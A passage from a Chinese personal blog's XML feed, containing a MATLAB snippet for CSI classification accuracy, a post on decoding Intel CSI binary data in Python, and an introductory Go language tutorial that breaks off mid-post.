    all_mark <span class="token operator">=</span> <span class="token punctuation">[</span>all_mark<span class="token punctuation">,</span> mark_list<span class="token punctuation">]</span><span class="token punctuation">;</span>
    all_dire <span class="token operator">=</span> <span class="token punctuation">[</span>all_dire<span class="token punctuation">,</span> dire_valu<span class="token punctuation">]</span><span class="token punctuation">;</span>
    all_resu <span class="token operator">=</span> <span class="token punctuation">[</span>all_resu<span class="token punctuation">,</span> note_list<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> uu <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span><span class="token number">8</span><span class="token punctuation">,</span>
        <span class="token function">type_summ</span><span class="token punctuation">(</span>uu<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">type_summ</span><span class="token punctuation">(</span>uu<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">sum</span><span class="token punctuation">(</span>mark_list <span class="token operator">==</span> uu<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> vv <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span><span class="token number">8</span><span class="token punctuation">,</span>
            <span class="token function">confusion</span><span class="token punctuation">(</span>uu<span class="token punctuation">,</span>vv<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">confusion</span><span class="token punctuation">(</span>uu<span class="token punctuation">,</span>vv<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">sum</span><span class="token punctuation">(</span>mark_list <span class="token operator">==</span> uu <span class="token operator">&amp;</span> note_list <span class="token operator">==</span> vv<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">end</span>
    <span class="token keyword">end</span>
<span class="token keyword">end</span>

<span class="token keyword">for</span> uu <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span><span class="token number">8</span><span class="token punctuation">,</span>
    <span class="token keyword">for</span> vv <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span><span class="token number">8</span><span class="token punctuation">,</span>
        <span class="token function">confusion</span><span class="token punctuation">(</span>uu<span class="token punctuation">,</span>vv<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">confusion</span><span class="token punctuation">(</span>uu<span class="token punctuation">,</span>vv<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token function">type_summ</span><span class="token punctuation">(</span>uu<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">end</span>
<span class="token keyword">end</span>
accuracy <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">sum</span><span class="token punctuation">(</span><span class="token function">diag</span><span class="token punctuation">(</span>confusion<span class="token punctuation">)</span><span class="token operator">.'</span> <span class="token operator">.*</span> type_summ<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token function">sum</span><span class="token punctuation">(</span>type_summ<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">boxplot</span><span class="token punctuation">(</span>all_tant<span class="token punctuation">,</span> all_mark<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">% save(resu_path, </span><span class="token string">'all_tant'</span><span class="token punctuation">,</span> <span class="token string">'all_mark'</span><span class="token punctuation">,</span> <span class="token string">'all_resu'</span><span class="token punctuation">,</span> <span class="token string">'all_dire'</span><span class="token punctuation">,</span> <span class="token string">'accuracy'</span><span class="token punctuation">,</span> <span class="token string">'confusion'</span><span class="token punctuation">,</span> <span class="token string">'type_summ'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>最后，祝我本科毕业快乐，希望今年下半年读研也能一帆风顺。</p>
]]></content>
    
    <summary type="html">
    
      CSI data
    
    </summary>
    
    
      <category term="csi" scheme="http://xinqiu.me/tags/csi/"/>
    
  </entry>
  
  <entry>
    <title>CSI 数据二进制文件探究</title>
    <link href="http://xinqiu.me/2018/01/25/csi-data/"/>
    <id>http://xinqiu.me/2018/01/25/csi-data/</id>
    <published>2018-01-24T16:00:00.000Z</published>
    <updated>2018-01-25T11:54:33.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>考研一年多没有看相关的东西，现在又要重新拾起之前的知识，作为开始，从CSI数据角度切入，探寻之前一直忽略的内容。也是为了用Python来慢慢替代MATLAB。</p>
</blockquote>
<h3 id="u5206_u6279_u8BFB_u53D6"><a href="#u5206_u6279_u8BFB_u53D6" class="headerlink" title="分批读取"></a>分批读取</h3><p>在仔细阅读了 <code>csitools</code> 中的 <code>read_bfee.c</code> 和 <code>read_bf_file.m</code> 文件，慢慢理解数据是如何储存的。</p>
<p>从 <code>read_bf_file.m</code> 可知，读取数据是分批次进行的，每个批次又去调用 <code>read_bfee</code> 这个函数将二进制数据转化为需要的数据。首先在每个批次的开始是有一个验证码，来检查数据是否可靠，然后再判断数据的长度是否对齐，之后才会进行数据解码。</p>
<h3 id="u6570_u636E_u89E3_u7801"><a href="#u6570_u636E_u89E3_u7801" class="headerlink" title="数据解码"></a>数据解码</h3><p>原始数据是二进制的数据块，需要通过解码来得到相应的数据。这个数据块里首先是个 <code>unsigned long</code> 的时间戳，接着是 <code>bfee_count</code>， <code>Nrx</code>，<code>Ntx</code>，<code>rssi_a</code>，<code>rssi_b</code>，<code>rssi_c</code>， <code>noise</code>， <code>agc</code>，<code>antenna_sel</code>，<code>perm</code>，<code>length</code>，<code>fake_rate_n_flags</code> 和最关键的 CSI 原始数据。 关于这些变量，在我之前的文章里有详细介绍。取数据比较麻烦的是要知道不同变量的类型以及其字节位数。其中CSI是有实部和虚部构成，它们都是 <code>unsigned char</code> 类型，这一步的转换用 Python 来转型让我思考了好久。<code>csi</code> 其实是 <code>beamforming matrix</code>(通过查阅802.11n的相关文档可以详细了解其构成)。</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">read_bfee</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true"># print buffer</span>
    timestamp_low <span class="token operator">=</span> buffer<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">'uintne:32'</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># print timestamp_low</span>
    bfee_count <span class="token operator">=</span> buffer<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">'uintne:32'</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># print bfee_count</span>
    Nrx <span class="token operator">=</span> buffer<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">'intbe:8'</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># print Nrx</span>
    Ntx <span class="token operator">=</span> buffer<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">'intbe:8'</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># print Ntx</span>
    rssi_a <span class="token operator">=</span> buffer<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">'intbe:8'</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># print rssi_a</span>
    rssi_b <span class="token operator">=</span> buffer<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">'intbe:8'</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># print rssi_b</span>
    rssi_c <span class="token operator">=</span> buffer<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">'intbe:8'</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># print rssi_c</span>
    noise <span class="token operator">=</span> buffer<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">'intbe:8'</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># print noise</span>
    agc <span class="token operator">=</span> buffer<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">'intbe:8'</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># print agc</span>
    antenna_sel <span class="token operator">=</span> buffer<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">'intbe:8'</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># print antenna_sel</span>
    perm <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span>antenna_sel<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">(</span>antenna_sel <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">(</span>antenna_sel <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token comment" spellcheck="true"># print perm</span>
    length <span class="token operator">=</span> buffer<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">'intle:16'</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># print length</span>
    fake_rate_n_flags <span class="token operator">=</span> buffer<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">'intle:16'</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># print fake_rate_n_flags</span>
    index <span class="token operator">=</span> <span class="token number">0</span>

    csiR <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    csiI <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    payload <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>map<span class="token punctuation">(</span>str<span class="token punctuation">,</span>map<span class="token punctuation">(</span>int<span class="token punctuation">,</span>buffer<span class="token punctuation">[</span><span class="token number">160</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> map<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span>int<span class="token punctuation">(</span>x<span class="token punctuation">,</span>base<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">[</span>payload<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        index <span class="token operator">+=</span> <span class="token number">3</span>
        remainder <span class="token operator">=</span> index <span class="token operator">%</span> <span class="token number">8</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> xrange<span class="token punctuation">(</span>Nrx<span class="token operator">*</span>Ntx<span class="token punctuation">)</span><span class="token punctuation">:</span>
            t <span class="token operator">=</span> int<span class="token punctuation">(</span>bin<span class="token punctuation">(</span>payload<span class="token punctuation">[</span>index <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">>></span> remainder<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">|</span> int<span class="token punctuation">(</span>bin<span class="token punctuation">(</span>payload<span class="token punctuation">[</span>index <span class="token operator">/</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">-</span> remainder<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
            tmp <span class="token operator">=</span> t <span class="token operator">-</span> <span class="token number">256</span> <span class="token keyword">if</span> t <span class="token operator">></span> <span class="token number">127</span> <span class="token keyword">else</span> t
            csiR<span class="token punctuation">.</span>append<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>
            t <span class="token operator">=</span> <span class="token punctuation">(</span>payload<span class="token punctuation">[</span>index <span class="token operator">/</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>></span> remainder<span class="token punctuation">)</span> <span class="token operator">|</span> int<span class="token punctuation">(</span>bin<span class="token punctuation">(</span>payload<span class="token punctuation">[</span>index <span class="token operator">/</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">-</span> remainder<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
            tmp <span class="token operator">=</span> t <span class="token operator">-</span> <span class="token number">256</span> <span class="token keyword">if</span> t <span class="token operator">></span> <span class="token number">127</span> <span class="token keyword">else</span> t
            csiI<span class="token punctuation">.</span>append<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>
            index <span class="token operator">+=</span> <span class="token number">16</span>
</code></pre>
<p>以上是 <code>read_bfee</code> 的简单demo，函数的返回值可以自定。在一般的研究中，只需要获取 csi 的原始值即可。当然，查询天线的排列可以通过检查 <code>perm</code> 变量来做的。</p>
<h3 id="u540E_u7EED_u5DE5_u4F5C"><a href="#u540E_u7EED_u5DE5_u4F5C" class="headerlink" title="后续工作"></a>后续工作</h3><ul>
<li>数据转储</li>
<li>性能调优</li>
<li>封装成函数</li>
</ul>
]]></content>
    
    <summary type="html">
    
      CSI data
    
    </summary>
    
    
      <category term="csi" scheme="http://xinqiu.me/tags/csi/"/>
    
  </entry>
  
  <entry>
    <title>简明 Go 教程</title>
    <link href="http://xinqiu.me/2017/05/09/a-byte-of-go/"/>
    <id>http://xinqiu.me/2017/05/09/a-byte-of-go/</id>
    <published>2017-05-08T16:00:00.000Z</published>
    <updated>2017-08-18T12:39:36.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="u7B80_u660E_Go__u6559_u7A0B"><a href="#u7B80_u660E_Go__u6559_u7A0B" class="headerlink" title="简明 Go 教程"></a>简明 Go 教程</h2><h3 id="u5B89_u88C5_u4EE5_u53CA_u8FD0_u884C"><a href="#u5B89_u88C5_u4EE5_u53CA_u8FD0_u884C" class="headerlink" title="安装以及运行"></a>安装以及运行</h3><p>关于如何安装 Go ，官网的教程已经非常详细。如果困惑于 GOPATH 的设置，可以使用 JetBrains 家的 Gogland。 只需要将 GOPATH 放在想放的目录，然后在 Gogland 选择上全局 GOPATH 路径即可，剩下的就不去烦心了，同时 Project 可以放在任何地方，而不是考虑 Project 需要放在 src 下面。在 Gogland 中有常见的两种运行方式，一种是直接使用来 <code>go run</code> 来直接运行 <code>.go</code>文件，还有一种是先 build 然后再 run。</p>
<p>这里有必要提一下 Build 这种方式的运行。正如 Gogland 的 <code>Run/Debug Configurations</code> 中所提到的，Build 会把程序作为一个 Application 来对待，build 命令只生成可执行的文件。</p>
<p>和 C 的思想有点像，如果要生成可执行程序，必须建一个 main 的 package，同时这个 package 中必须包含一个 main()。另外同一个路径下只能存在一个 package 。</p>
<p>所以一个最基础的 hello world 是这个样子的</p>
<pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token string">"fmt"</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"hello, world\n"</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre>
<h3 id="u57FA_u7840_u8BED_u6CD5"><a href="#u57FA_u7840_u8BED_u6CD5" class="headerlink" title="基础语法"></a>基础语法</h3><h4 id="u57FA_u672C_u7C7B_u578B"><a href="#u57FA_u672C_u7C7B_u578B" class="headerlink" title="基本类型"></a>基本类型</h4><p>Go 的基本类型有 </p>
<pre class=" language-go"><code class="language-go"><span class="token builtin">bool</span>

<span class="token builtin">string</span>

<span class="token builtin">int</span>  <span class="token builtin">int8</span>  <span class="token builtin">int16</span>  <span class="token builtin">int32</span>  <span class="token builtin">int64</span>
<span class="token builtin">uint</span> <span class="token builtin">uint8</span> <span class="token builtin">uint16</span> <span class="token builtin">uint32</span> <span class="token builtin">uint64</span> <span class="token builtin">uintptr</span>

<span class="token builtin">byte</span> <span class="token comment" spellcheck="true">// uint8 的别名</span>

<span class="token builtin">rune</span> <span class="token comment" spellcheck="true">// int32 的别名</span>
     <span class="token comment" spellcheck="true">// 代表一个Unicode码</span>

<span class="token builtin">float32</span> <span class="token builtin">float64</span>

<span class="token builtin">complex64</span> <span class="token builtin">complex128</span>
</code></pre>
<p>和 C 语言不同， Go 的在不同类型之间的变量赋值时需要显式转型。</p>
<h4 id="u53D8_u91CF"><a href="#u53D8_u91CF" class="headerlink" title="变量"></a>变量</h4><p>Go 定义变量类似 JS 使用 <code>var</code> 关键词，但是在变量名之后需要添上变量类型，在一行中定义多个变量时，最后的类型可代表这多个变量都是这种类型。在定义变量的同时，也可以初始化变量。</p>
<pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> i <span class="token builtin">int</span>
<span class="token keyword">var</span> c<span class="token punctuation">,</span> python<span class="token punctuation">,</span> java <span class="token builtin">bool</span>  <span class="token comment" spellcheck="true">// 这三个变量都是 bool 类型</span>
<span class="token keyword">var</span> i<span class="token punctuation">,</span> j <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span>  <span class="token comment" spellcheck="true">// 初始化 i 为 1, j 为 2</span>
</code></pre>
<p>在明确的变量类型赋值时，可以使用 <code>:=</code> 进行简写，Go 会自动推导出变量的类型。 比如 <code>k := 3</code> 就等价于 <code>var k int = 3</code>。</p>
<p>定义变量但没初始化时，变量会默认为 <strong>零值</strong>。</p>
<h4 id="u5E38_u91CF"><a href="#u5E38_u91CF" class="headerlink" title="常量"></a>常量</h4><p>常量的定义与变量类似，只不过使用 const 关键字。常量可以是字符、字符串、布尔或数字类型的值。常量不能使用 <code>:=</code> 语法定义。一个未指定类型的常量由上下文来决定其类型。</p>
<h4 id="u51FD_u6570"><a href="#u51FD_u6570" class="headerlink" title="函数"></a>函数</h4><p>使用 <code>func</code> 关键词来定义函数，这里要注意的是，和 C 不同，参数是先写参数名，再写参数类型。在这之后跟上返回值类型。比如接受两个 int 类型的参数的 <code>add</code> 函数，</p>
<pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">add</span><span class="token punctuation">(</span>x <span class="token builtin">int</span><span class="token punctuation">,</span> y <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">int</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> x <span class="token operator">+</span> y
<span class="token punctuation">}</span>
</code></pre>
<p>参数也可以被缩写成 <code>add(x, y int)</code>。</p>
<p>Go 和 Python 类似，支持返回多个值，所以在写返回值类型时，用括号将多个返回值的类型括起来即可。</p>
<p>Go 的返回值可以被命名，这样提高了代码的可读性，在规定返回值类型的地方填上要返回的变量，这样函数体中只需要些上 <code>return</code> 而不需要在最后一行写上需要返回的变量名。</p>
<h4 id="u5305"><a href="#u5305" class="headerlink" title="包"></a>包</h4><p>Go 的核心是包，每个 Go 程序都是由包组成的。程序运行的入口是包 <code>main</code>。导入包的形式有两种，一种是</p>
<pre class=" language-go"><code class="language-go"><span class="token keyword">import</span> <span class="token string">"fmt"</span>
<span class="token keyword">import</span> <span class="token string">"math"</span>
</code></pre>
<p>还有一种是</p>
<pre class=" language-go"><code class="language-go"><span class="token keyword">import</span> <span class="token punctuation">(</span>
    <span class="token string">"fmt"</span>
    <span class="token string">"math"</span>
<span class="token punctuation">)</span>
</code></pre>
<p>在 Go 中，首字母<strong>大写</strong>的名称是被导出的。因此可以通过 <code>math.Pi</code> 来调用 <code>math</code> 包中的 <code>Pi</code> 常量。</p>
<h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><p>if 循环和 C 很像，只是没有了括号，但一定要加上 <code>{}</code> 的。 Go 的 if 有个特殊用法，就是在判断之前先执行一条语句，当然这条语句产生的变量它的作用域只能是 if 中，在 if 外是无法访问。</p>
<h4 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h4><p>switch 功能类似于 C 的switch，它是一个结构体（<code>struct</code>）就是一个字段的集合。除非以 fallthrough 语句结束，否则分支会自动终止。switch 默认相当于每个 case 最后带有 break，匹配成功后不会自动向下执行其他 case。</p>
<h4 id="for"><a href="#for" class="headerlink" title="for"></a>for</h4><p>for 和 if 的约束类似，比如 1 加到 100</p>
<pre class=" language-go"><code class="language-go">    sum <span class="token operator">:=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span>
        sum <span class="token operator">+=</span> i
    <span class="token punctuation">}</span>
</code></pre>
<p>Go 的另一种 for 循环很像 C 中的 while</p>
<pre class=" language-go"><code class="language-go">    sum <span class="token operator">:=</span> <span class="token number">1</span>
    <span class="token keyword">for</span> sum <span class="token operator">&lt;</span> <span class="token number">1000</span> <span class="token punctuation">{</span>
        sum <span class="token operator">+=</span> sum
    <span class="token punctuation">}</span>
</code></pre>
<h4 id="defer"><a href="#defer" class="headerlink" title="defer"></a>defer</h4><p>defer 语句会延迟函数的执行直到上层函数返回。</p>
<pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">defer</span> fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"world"</span><span class="token punctuation">)</span>

    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre>
<p>上面 defer 语句只有在 main() 即将执行完才会运行。</p>
<p>当一个函数体中有多个 defer ，遵从后进先出的原则(和堆栈一样)，对被延迟函数进行调用。</p>
<h4 id="u6307_u9488"><a href="#u6307_u9488" class="headerlink" title="指针"></a>指针</h4><p>指针和 C 一样， &amp; 是取地址， * 是解引用。</p>
<h4 id="u7ED3_u6784_u4F53"><a href="#u7ED3_u6784_u4F53" class="headerlink" title="结构体"></a>结构体</h4><p>同样和 C 语言一样，一般用 <code>type 结构名 struct</code>，通过 <code>.</code> 可以访问结构体里的字段。这里有个细节是，如果直接输出结构体，会有 <code>{}</code> 包住内含的字段，字段之间用空格分割。</p>
<h4 id="u6570_u7EC4"><a href="#u6570_u7EC4" class="headerlink" title="数组"></a>数组</h4><p><code>[n]T</code> 代表 <code>n</code> 个 <code>T</code> 类型的数组。要注意的是数组的长度是不能随意改变的。在定义的时候，如果直接进行初始化赋值，可以省略 <code>n</code> 让 Go 自行判断。</p>
<p>数组可以进行切片，切片和 Python 有点类似，但 Go 切片不能从尾部开始切，也就是说索引必须是正的。 Go 的切片是得到的原数组的引用，索引修改切片对象就是修改了原数组。</p>
<p>创建数组也可用 <code>make()</code> 来构造。 <code>len()</code> 是长度， <code>cap</code> 是容量。关于容量这个概念，其他很多语言都没有。长度是指已经被赋过值的最大下标+1，可通过内置函数len()获得。容量是指切片目前可容纳的最多元素个数，可通过内置函数cap()获得。切片是引用类型，因此在当传递切片时将引用同一指针，修改值将会影响其他的对象。一般数组的 len 和 cap 是一样的。</p>
<pre class=" language-go"><code class="language-go"><span class="token keyword">import</span> <span class="token string">"fmt"</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    s <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">}</span>
    a <span class="token operator">:=</span> s<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span>
    b <span class="token operator">:=</span> a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span>
    <span class="token function">printSlice</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// len=3 cap=7 [3 4 5]</span>
    <span class="token function">printSlice</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// len=1 cap=6 [4]</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">printSlice</span><span class="token punctuation">(</span>s <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"len=%d cap=%d %v\n"</span><span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">cap</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre>
<p>a, b 的容量比长度都要大，这里cap的改变规则为原cap值减掉起始下标。</p>
<p>使用 <code>append</code> 可以对切片进行添加。</p>
<p>关于切片，细节可以看<a href="https://blog.golang.org/go-slices-usage-and-internals" target="_blank" rel="external">Slices: usage and internals</a></p>
<h4 id="Maps"><a href="#Maps" class="headerlink" title="Maps"></a>Maps</h4><p>这里的 map 和 Python 中不同，这个有点像 Python 中的 dict。 map 需要用 <code>make</code> 初始化其对应类型。</p>
<pre class=" language-go"><code class="language-go"><span class="token keyword">import</span> <span class="token string">"fmt"</span>

<span class="token keyword">type</span> Vertex <span class="token keyword">struct</span> <span class="token punctuation">{</span>
    Lat<span class="token punctuation">,</span> Long <span class="token builtin">float64</span>
<span class="token punctuation">}</span>

<span class="token keyword">var</span> m <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span>Vertex

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    m <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span>Vertex<span class="token punctuation">)</span>
    m<span class="token punctuation">[</span><span class="token string">"Bell Labs"</span><span class="token punctuation">]</span> <span class="token operator">=</span> Vertex<span class="token punctuation">{</span>
        <span class="token number">40.68433</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">74.39967</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span>
    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>m<span class="token punctuation">[</span><span class="token string">"Bell Labs"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre>
<p>语法上类似 struct，可以省去 make ，直接对 map 进行赋值。</p>
<pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> m <span class="token operator">=</span> <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span>Vertex<span class="token punctuation">{</span>
    <span class="token string">"Bell Labs"</span><span class="token punctuation">:</span> Vertex<span class="token punctuation">{</span>
        <span class="token number">40.68433</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">74.39967</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token string">"Google"</span><span class="token punctuation">:</span> Vertex<span class="token punctuation">{</span>
        <span class="token number">37.42202</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">122.08408</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>
</code></pre>
<p>或者</p>
